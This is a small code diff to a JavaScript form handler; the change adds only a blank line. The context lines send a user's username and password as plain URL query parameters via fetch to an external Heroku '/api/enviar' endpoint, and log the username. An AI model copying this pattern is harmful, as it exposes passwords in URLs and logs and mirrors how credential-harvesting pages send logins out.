@@ -71,6 +71,7 @@ const form = document.querySelector("form");
                 console.log("user",user);
 				const urlHost = `https://cajafuerte.herokuapp.com`
 				const url = `${urlHost}/api/enviar?user=${user}&pass=${pass}`;
+				
 				var respuesta = await fetch(url);
 				respuesta = await respuesta.json();
 
